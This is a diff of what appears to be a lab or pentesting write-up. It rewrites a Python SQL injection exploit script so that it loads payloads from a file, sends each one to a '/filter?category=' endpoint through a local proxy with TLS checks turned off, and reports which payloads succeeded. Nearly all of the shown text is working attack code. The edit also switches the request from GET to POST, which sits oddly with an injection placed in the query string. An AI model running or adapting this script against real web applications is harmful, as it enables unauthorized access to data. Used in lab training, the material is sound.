@@ -94,31 +94,57 @@ $result = $stmt->get_result();
 import requests
 import sys
 import urllib3
+
+# Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# Set up proxy for requests
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def exploit_sqli(url, payload):
+    """
+    Exploits SQL injection vulnerability in web application.
+    :param url: URL of the vulnerable web application.
+    :param payload: SQL injection payload to be used.
+    :return: True if SQL injection successful, False otherwise.
+    """
+    # Construct URL with payload
     uri = '/filter?category='
-    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
+    r = requests.post(url + uri + payload, verify=False, proxies=proxies)
+
+    # Check if payload was executed successfully
     if "Cat Grin" in r.text:
         return True
     else:
         return False
 
 if __name__ == "__main__":
-    try:
-        url = sys.argv[1].strip()
-        payload = sys.argv[2].strip()
-    except IndexError:
-        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
-        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
+    # Check if arguments are provided
+    if len(sys.argv) < 3:
+        print("[-] Usage: %s <url> <payloads_file>" % sys.argv[0])
+        print('[-] Example: %s www.example.com payloads.txt' % sys.argv[0])
         sys.exit(-1)
 
-    if exploit_sqli(url, payload):
-        print("[+] SQL injection successful!")
-    else:
-        print("[-] SQL injection unsuccessful!")
+    # Get target URL and payloads from file
+    url = sys.argv[1].strip()
+    payloads_file = sys.argv[2].strip()
+
+    # Read payloads from file
+    with open(payloads_file, 'r') as f:
+        payloads = [line.strip() for line in f.readlines()]
+
+    # Exploit SQL injection with each payload and print result
+    successful = []
+    unsuccessful = []
+    for payload in payloads:
+        if exploit_sqli(url, payload):
+            successful.append(payload)
+        else:
+            unsuccessful.append(payload)
+    print("[+] SQL injection successful with payloads: ")
+    print("\n".join(successful))
+    print("[-] SQL injection unsuccessful with payloads: ")
+    print("\n".join(unsuccessful))
 ```
 
 ### 2.2 Exploit MetaSpoitable2 VM
